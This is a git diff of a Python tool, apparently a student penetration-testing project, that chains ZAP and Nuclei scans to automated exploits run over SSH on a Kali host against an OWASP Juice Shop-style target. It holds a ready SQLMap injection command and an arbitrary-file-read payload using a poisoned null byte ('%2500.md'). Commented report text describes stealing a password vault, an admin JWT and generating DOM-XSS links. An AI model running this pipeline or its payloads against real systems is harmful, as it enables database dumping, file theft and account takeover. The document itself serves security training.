@@ -155,8 +155,7 @@ def announce_sqlmap_placeholder(kali_ip: str) -> None:
 def run_remote_sqlmap(target_url: str, kali_ip: str) -> None:
     print(f"\n[!] Initiating automated SQLMap attack on raw URL: {target_url}")
     
-    # === ניקוי ה-URL והוספת לייזר (Asterisk) ===
-    # הפעם נחליף את q=1 ב-q=1* # הכוכבית אומרת ל-SQLMap: אל תעשה בדיקות רקע, פשוט תזריק את הקוד הזדוני בדיוק כאן!
+    import re
     clean_url = re.sub(r'q=.*', 'q=1*', target_url)
     print(f"[*] Sanitized and targeted URL for SQLMap: {clean_url}")
     
@@ -170,20 +169,16 @@ def run_remote_sqlmap(target_url: str, kali_ip: str) -> None:
         print(f"[*] Connecting to Kali ({kali_ip}) via SSH...")
         ssh.connect(hostname=kali_ip, username=username, password=password)
         
-        # בניית פקודת התקיפה:
-        # 1. הורדנו את --smart
-        # 2. --technique=BEU - מיקוד בשיטות פריצה שמתאימות לאפליקציות מודרניות
+        # שינוי הפקודה כך שתשאב את התוכן של טבלת המשתמשים (Users)
         sqlmap_cmd = f"sqlmap -u \"{clean_url}\" --batch --tables --dbms=sqlite --technique=BEU --level=2 --risk=2 --random-agent --flush-session"
-        #sqlmap_cmd = f"sqlmap -u \"{clean_url}\" --batch -T Users --dump --dbms=sqlite --technique=BEU --level=2 --risk=2 --random-agent 2>&1"
         print(f"[*] Executing payload: {sqlmap_cmd}")
         
         stdin, stdout, stderr = ssh.exec_command(sqlmap_cmd)
-        
         output = stdout.read().decode('utf-8')
         
-        print("\n=== SQLMAP OUTPUT ===")
+        print("\n=== SQLMAP OUTPUT (USERS TABLE DUMP) ===")
         print(output)
-        print("=====================\n")
+        print("========================================\n")
             
     except Exception as e:
         print(f"[-] Automated attack failed: {e}")
@@ -447,10 +442,6 @@ def run_remote_lfi_extractor(target_url: str, kali_ip: str) -> None:
     try:
         ssh.connect(hostname=kali_ip, username=username, password=password)
         
-        # הפיבוט (Pivot) המושלם:
-        # אנחנו מפסיקים לנסות לברוח מהתיקייה עם ../
-        # במקום זאת, אנחנו מנצלים את המודיעין מה-FTP Pillager!
-        # אנחנו מבקשים את קובץ הגיבוי ועוקפים רק את סינון הסיומות.
         payload = "/ftp/package.json.bak%2500.md"
         attack_url = f"{base_url}{payload}"
         
@@ -461,16 +452,15 @@ def run_remote_lfi_extractor(target_url: str, kali_ip: str) -> None:
         
         output = stdout.read().decode('utf-8')
         
-        # אנחנו בודקים אם קובץ הקונפיגורציה נשאב בהצלחה
         if "juice-shop" in output or "dependencies" in output:
             print("\n" + "="*70)
             print("[+++] CRITICAL ARBITRARY FILE READ EXPLOITED [+++]")
             print("[+] Successfully bypassed file extension restrictions!")
             print("[+] Filter evasion successful using Poisoned Null Byte (%2500.md)")
-            print("\n[*] Extracted 'package.json.bak' from server (First 15 lines):")
+            print("\n[*] Extracted 'package.json.bak' FULL CONTENT:")
             
-            # מדפיסים את התוכן של הקובץ ששאבנו!
-            for line in output.split('\n')[:15]:
+            # הדפסת כל הקובץ ללא הגבלה!
+            for line in output.split('\n'):
                 if line.strip():
                     print(f"    {line}")
             print("="*70 + "\n")
@@ -543,8 +533,230 @@ EXPLOIT_ROUTER = {
     ],
 }
 
+# def generate_html_report(target_url: str, all_findings: list) -> None:
+#     print("\n[*] Generating Final Penetration Testing Report (HTML)...")
+#     import time
+    
+#     # קיבוץ הממצאים של ZAP ו-Nuclei למניעת כפילויות ארוכות
+#     unique_findings = {}
+#     for finding in all_findings:
+#         name = finding.get('alert', 'Unknown Vulnerability')
+#         risk = finding.get('risk', 'Informational')
+#         source = finding.get('source', 'ZAP')
+#         if name not in unique_findings:
+#             unique_findings[name] = {'risk': risk, 'count': 1, 'source': source}
+#         else:
+#             unique_findings[name]['count'] += 1
+
+#     # בניית שורות הטבלה ב-HTML
+#     table_rows = ""
+#     for name, data in unique_findings.items():
+#         table_rows += f"""
+#         <tr>
+#             <td>{name}</td>
+#             <td>{data['risk']}</td>
+#             <td>{data['source']}</td>
+#             <td>{data['count']}</td>
+#         </tr>
+#         """
+
+#     html_content = f"""<!DOCTYPE html>
+# <html lang="he" dir="rtl">
+# <head>
+#     <meta charset="UTF-8">
+#     <title>דו"ח מסכם - פרויקט סייבר מתקדם</title>
+#     <style>
+#         body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 0; background-color: #f4f4f4; color: #333; }}
+#         .container {{ width: 85%; margin: auto; overflow: hidden; padding: 30px; background: #fff; box-shadow: 0 0 15px rgba(0,0,0,0.1); margin-top: 30px; margin-bottom: 30px; border-radius: 8px; }}
+#         h1, h2, h3 {{ color: #2c3e50; }}
+#         h1 {{ border-bottom: 4px solid #e74c3c; padding-bottom: 10px; text-align: center; }}
+#         h2 {{ border-bottom: 2px solid #ecf0f1; padding-bottom: 5px; margin-top: 40px; }}
+#         .critical {{ color: #e74c3c; font-weight: bold; }}
+#         .screenshot-placeholder {{ border: 2px dashed #bdc3c7; background-color: #f8f9fa; padding: 50px; text-align: center; color: #7f8c8d; margin: 20px 0; font-style: italic; border-radius: 5px; }}
+#         .meta-info {{ background: #34495e; color: #ecf0f1; padding: 20px; border-radius: 8px; margin-bottom: 30px; }}
+#         .meta-info p {{ margin: 8px 0; font-size: 1.1em; }}
+#         table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
+#         th, td {{ border: 1px solid #bdc3c7; padding: 12px; text-align: right; }}
+#         th {{ background-color: #ecf0f1; color: #2c3e50; }}
+#     </style>
+# </head>
+# <body>
+#     <div class="container">
+#         <h1>דו"ח בדיקות חדירה וסריקת פגיעויות אוטומטית</h1>
+        
+#         <div class="meta-info">
+#             <p><strong>פרויקט:</strong> מערכת CrossGuard-AI</p>
+#             <p><strong>צוות תקיפה ומחקר:</strong> אורון, עמית, איתי, מאור</p>
+#             <p><strong>יעד הסריקה:</strong> {target_url}</p>
+#             <p><strong>תאריך הפקה:</strong> {time.strftime("%d/%m/%Y %H:%M:%S")}</p>
+#         </div>
+
+#         <h2>1. תקציר מנהלים ומתודולוגיה</h2>
+#         <p>דו"ח זה הופק במסגרת פרויקט הגמר בסייבר מתקדם. פיתחנו כלי אוטומטי מבוסס פייתון המשלב מנועי סריקה מתקדמים (OWASP ZAP ו-Nuclei). הכלי מבצע שלב Reconnaissance למיפוי משטח התקיפה, ולאחריו מפעיל נתב (Router) חכם המתרגם את ההתראות לפעולות אקספלויטציה ממוקדות באמצעות כלים כגון SQLMap, Dirb וסקריפטים ייעודיים שנכתבו על ידי הצוות.</p>
+
+#         <h2>2. תוצאות סריקת פגיעויות (ZAP & Nuclei)</h2>
+#         <p>להלן ריכוז החולשות שאותרו על ידי מנועי הסריקה הסטטיים והדינאמיים בטרם שלב הניצול (Exploitation):</p>
+#         <table>
+#             <thead>
+#                 <tr>
+#                     <th>שם ההתראה / חולשה</th>
+#                     <th>רמת סיכון</th>
+#                     <th>מקור (סורק)</th>
+#                     <th>מספר מופעים</th>
+#                 </tr>
+#             </thead>
+#             <tbody>
+#                 {table_rows}
+#             </tbody>
+#         </table>
+
+#         <h2>3. ממצאי ניצול חולשות (Exploitation)</h2>
+
+#         <h3>3.1 דליית מסד נתונים - חשיפת טבלת משתמשים (SQL Injection)</h3>
+#         <p><strong>תיאור:</strong> בעקבות זיהוי הזרקת SQL, המערכת שיגרה את פיילוד ה-SQLMap אשר עקף את מנגנוני ההגנה, פרץ למסד הנתונים SQLite ושאב (Dump) בהצלחה את טבלת המשתמשים במלואה, כולל סיסמאות מגוהבות (Hashed).</p>
+#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של פלט SQLMap מציג את טבלת ה-Users]</div>
+
+#         <h3>3.2 קריאת קבצים שרירותית (Arbitrary File Read / LFI)</h3>
+#         <p><strong>תיאור:</strong> באמצעות עקיפת סינון סיומות (Extension Bypass) וטריק Poisoned Null Byte, הצלחנו לשאוב את הקובץ <span class="critical">package.json.bak</span>. קובץ זה מכיל את גרסת המערכת ואת כלל התלויות שלה (Dependencies) במלואן.</p>
+#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של פלט ה-LFI המלא (package.json)]</div>
+
+#         <h3>3.3 חשיפת מידע רגיש (Security Misconfiguration)</h3>
+#         <p><strong>תיאור:</strong> כלי ה-FTP Pillager סרק תיקיות חשופות שאותרו על ידי Dirb, וחילץ את קובץ כספת הסיסמאות הארגוני (incident-support.kdbx), אשר פותח פתח לפריצה רוחבית לארגון כולו.</p>
+#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של רשימת הקבצים שנגנבו מה-FTP]</div>
+
+#         <h3>3.4 השתלטות מנהל וגניבת JWT (Broken Access Control)</h3>
+#         <p><strong>תיאור:</strong> כלי ה-Admin Hijacker שלנו פוצח את ממשק ה-API וחילץ את סיסמת מנהל המערכת, יחד עם טוקן ה-JWT הראשי המאפשר שליטה מלאה באתר.</p>
+#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של טוקן ה-JWT הגנוב]</div>
+
+#         <h3>3.5 הזרקת פישינג ו-XSS למערכת (CrossGuard-AI Testing)</h3>
+#         <p><strong>תיאור:</strong> המערכת ייצרה באופן אוטומטי 20 קישורים מורעלים מבוססי DOM-XSS שעוקפים הגנות Angular. קישורים אלו משמשים לבחינת מודל ה-ML של בוט הדיסקורד שלנו בחסימת איומים בזמן אמת.</p>
+#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של חלונית ה-XSS שקופצת בדפדפן]</div>
+
+#     </div>
+# </body>
+# </html>"""
+    
+#     file_name = "Advanced_Cyber_Project_Report.html"
+#     try:
+#         with open(file_name, "w", encoding="utf-8") as f:
+#             f.write(html_content)
+#         print(f"\n[+] Professional PDF-ready Report generated successfully: {file_name}")
+#         print("[*] INSTRUCTIONS TO CREATE PDF: Double-click the HTML file to open it in your browser, then press Ctrl+P and select 'Save as PDF'.")
+#     except Exception as e:
+#         print(f"[-] Failed to generate report: {e}")
+
+def ai_report_analyzer(raw_logs: str, target_url: str, findings: list):
+    print("\n[AI] Initializing REAL Artificial Intelligence Analysis...")
+    print("[AI] Sending terminal logs and scanner findings to LLM for deep context analysis. Please wait...")
+    
+    try:
+        from google import genai
+        import os
+        import time
+        from urllib.parse import urlparse
+        
+        # טעינת מפתח ה-API
+        ai_api_key = os.getenv("GEMINI_API_KEY")
+        if not ai_api_key:
+            print("[-] Error: GEMINI_API_KEY missing in .env. Cannot perform real AI analysis.")
+            return
+
+        client = genai.Client(api_key=ai_api_key)
+        
+        # === התוספת החסרה: ארגון ממצאי ZAP ו-Nuclei עבור ה-AI ===
+        scanner_summary = ""
+        unique_findings = {}
+        for f in findings:
+            name = f.get('alert', 'Unknown Vulnerability')
+            risk = f.get('risk', 'Info')
+            source = f.get('source', 'ZAP')
+            if name not in unique_findings:
+                unique_findings[name] = {'risk': risk, 'count': 1, 'source': source}
+            else:
+                unique_findings[name]['count'] += 1
+                
+        for name, data in unique_findings.items():
+            scanner_summary += f"- {name} | Risk: {data['risk']} | Source: {data['source']} | Count: {data['count']}\n"
+            
+        if not scanner_summary:
+            scanner_summary = "No pre-exploitation scanner findings recorded."
+
+        # === בניית הפרומפט המנחה (Prompt Engineering) המעודכן ===
+        prompt = f"""
+        You are an expert Cybersecurity Analyst.
+        I am providing you with the data from an automated penetration test conducted against: {target_url}.
+        The test was done for the CrossGuard-AI project.
+        
+        You must generate a professional, comprehensive Penetration Testing Report in HTML format.
+        
+        CRITICAL INSTRUCTIONS:
+        1. The report MUST be written in Hebrew (עברית).
+        2. Use <html lang="he" dir="rtl">.
+        3. Include professional CSS styling (dark headers, clean tables, red text for critical findings).
+        4. The report must contain these sections exactly:
+           - תקציר מנהלים (Executive Summary): Summary of the automated process (Scanners -> Router -> Exploits).
+           - ממצאי סריקה ראשונית (ZAP & Nuclei): Create a clean HTML table summarizing the "Scanner Findings" provided below. Show the vulnerability name, risk level, source scanner, and count.
+           - ממצאי תקיפה מפורטים (Exploitation Phase): Extract the precise successes from the "Raw Terminal Logs" (e.g., SQLMap tables, FTP stolen files, specific JWT token, LFI package.json details). Give each exploit a proper title.
+           - מסקנות והמלצות (Recommendations): How to fix the identified issues in the system.
+        5. Return ONLY the raw HTML code. Do not wrap it in markdown blocks (like ```html).
+
+        === SCANNER FINDINGS (ZAP & Nuclei) ===
+        {scanner_summary}
+
+        === RAW TERMINAL LOGS (Exploitation Phase) ===
+        {raw_logs}
+        """
+        
+        # שליחת הבקשה
+        response = client.models.generate_content(
+            model='gemini-2.5-flash',
+            contents=prompt,
+        )
+        
+        html_output = response.text.strip()
+        
+        # ניקוי שאריות Markdown
+        if html_output.startswith("```html"):
+            html_output = html_output[7:]
+        elif html_output.startswith("```"):
+            html_output = html_output[3:]
+        if html_output.endswith("```"):
+            html_output = html_output[:-3]
+            
+        # שמירת הקובץ
+        domain = urlparse(target_url).netloc.replace(".", "_").replace(":", "_")
+        timestamp = time.strftime("%Y%m%d_%H%M%S")
+        file_name = f"Real_AI_Report_{domain}_{timestamp}.html"
+        
+        with open(file_name, "w", encoding="utf-8") as f:
+            f.write(html_output)
+            
+        print(f"\n[+++] AI Analysis Complete! [+++]")
+        print(f"[+] The AI successfully parsed both Scanners and Exploits into the HTML report.")
+        print(f"[+] Report saved to: {file_name}")
+        
+    except ImportError:
+        print("\n[-] Error: The 'google-genai' package is not installed.")
+    except Exception as e:
+        print(f"[-] AI Generation failed: {e}")
+
 def main() -> int:
   args = parse_args()
+
+  # === קסם לאיסוף כל ההדפסות (Print) מכל הפונקציות וה-Threads לטובת ה-AI ===
+  terminal_logs = ""
+  import builtins
+  original_print = builtins.print
+
+  def custom_print(*print_args, **kwargs):
+      nonlocal terminal_logs
+      msg = " ".join(str(a) for a in print_args)
+      terminal_logs += msg + "\n"
+      original_print(*print_args, **kwargs)
+
+  # דורסים את הפרינט הרגיל בפרינט החכם שלנו
+  builtins.print = custom_print
+  # =========================================================================
 
   try:
     target_url = validate_target_url(args.target_url)
@@ -558,96 +770,65 @@ def main() -> int:
     return 1
 
   try:
-    # === שלב 1: סריקות במקביל (ZAP + Nuclei) ===
-    print("\n[*] [PHASE 1] Starting parallel scans (ZAP and Nuclei)...")
+    print(f"\n[*] [PHASE 1] Starting Parallel Scans on: {target_url}")
     
-    # ניצור רשימה ריקה שתתמלא מתוך ה-Thread של Nuclei
     nuclei_alerts = []
-    
-    # משגרים את Nuclei שיעבוד ברקע על ה-Kali במקביל
     nuclei_thread = threading.Thread(target=run_remote_nuclei, args=(target_url, kali_ip, nuclei_alerts))
     nuclei_thread.start()
 
-    # בינתיים, התוכנית הראשית שלנו מריצה את ZAP
-    print(f"[*] Connecting to ZAP at {DEFAULT_ZAP_PROXY}")
     zap = create_zap_client(api_key)
-    print(f"[+] Connected to ZAP version {zap.core.version}")
-
-    print(f"[*] Opening target in ZAP: {target_url}")
+    print(f"[*] ZAP Engine Connected. Initializing spider...")
     zap.urlopen(target_url)
-
-    print("[*] Starting AJAX spider scan...")
     zap.ajaxSpider.scan(url=target_url)
     wait_for_ajax_spider(zap, args.poll_interval)
 
-    print("[*] Waiting 5 seconds for passive scanning to settle...")
-    time.sleep(5)
-
-    print("[*] Starting active scan...")
+    print("[*] Starting Active Scan for vulnerabilities...")
     active_scan_id = zap.ascan.scan(target_url)
     wait_for_completion("Active Scan", zap.ascan.status, active_scan_id, args.poll_interval)
 
     zap_alerts = fetch_all_alerts(zap)
-    print(f"[*] Retrieved {len(zap_alerts)} alerts from ZAP.")
-    print_alerts(zap_alerts)
-
-    # ZAP סיים. עכשיו אנחנו מוודאים שגם Nuclei סיים לפני שממשיכים
-    print("\n[*] Waiting for Nuclei background scan to complete...")
+    print(f"[*] Scanners finished. ZAP found {len(zap_alerts)} alerts.")
+    
     nuclei_thread.join() 
-    print("[+] Phase 1 Complete. All scanners finished.")
-
-    # === שלב 2: איחוד הנתונים (Data Normalization) ===
-    print("\n[*] [PHASE 2] Merging findings from all scanners...")
-    # עכשיו אנחנו באמת מאחדים את שני מקורות המודיעין ל"בריכה" אחת!
+    
+    # איחוד ממצאים
     all_findings = zap_alerts.copy() 
     all_findings.extend(nuclei_alerts)
-    print(f"[*] Total vulnerabilities aggregated for routing: {len(all_findings)}")
 
-    # === שלב 3: הנתב - תקיפה ממוקדת (Exploitation) ===
-    print("\n[*] [PHASE 3] Routing alerts to exploit tools...")
+    print("\n[*] [PHASE 2] Routing to Specialized Exploit Tools...")
     
     launched_tools = set()
     active_attack_threads = []
     
-    # הפעלת ברירת מחדל: Dirb לטובת גילוי נתיבים (כי ZAP לא תמיד רואה ספריות נסתרות)
-    if "run_remote_dirb" not in launched_tools:
-        print("[*] Triggering default reconnaissance: run_remote_dirb")
-        dirb_thread = threading.Thread(target=run_remote_dirb, args=(target_url, kali_ip))
-        active_attack_threads.append(dirb_thread)
-        dirb_thread.start()
-        launched_tools.add("run_remote_dirb")
-
-    # ניתוב חכם לפי ממצאים למילון הכלים (EXPLOIT_ROUTER)
+    # הרצת הנתב (Router)
     for finding in all_findings:
         alert_name = finding.get('alert', '').lower()
         url = finding.get('url', '')
         
         for vulnerability_keyword, actions in EXPLOIT_ROUTER.items():
             if vulnerability_keyword in alert_name:
-                
-                # תמיכה גם בכלי בודד וגם ברשימת כלים מאותו סוג התראה
-                if isinstance(actions, list):
-                    funcs_to_run = actions
-                else:
-                    funcs_to_run = [actions]
-                    
+                funcs_to_run = actions if isinstance(actions, list) else [actions]
                 for attack_function in funcs_to_run:
                     if attack_function.__name__ not in launched_tools:
-                        print(f"[*] Match! Routing '{vulnerability_keyword}' to {attack_function.__name__}")
-                        
+                        print(f"[*] AI Match: Routing '{vulnerability_keyword}' to {attack_function.__name__}")
+
                         t = threading.Thread(target=attack_function, args=(url, kali_ip))
                         active_attack_threads.append(t)
                         t.start()
-                        
                         launched_tools.add(attack_function.__name__)
                 
-    # המתנה לסיום כל כלי התקיפה והמודיעין
     if active_attack_threads:
-        print(f"[*] Waiting for {len(active_attack_threads)} attack/recon tools to finish...")
+        print(f"[*] Executing {len(active_attack_threads)} automated exploits...")
         for t in active_attack_threads:
             t.join()
 
-    print("\n[+] All automated attacks have completed successfully!")
+    print("\n[+] All automated tasks completed.")
+    
+    # החזרת הפרינט המקורי כדי לא לשבש דברים אחרים בסוף הריצה
+    builtins.print = original_print
+
+    # === שלב ה-AI: יצירת הדו"ח החכם עם הפלט שנאסף ===
+    ai_report_analyzer(terminal_logs, target_url, all_findings)
 
   except KeyboardInterrupt:
     print("\n[-] Scan interrupted by user.")
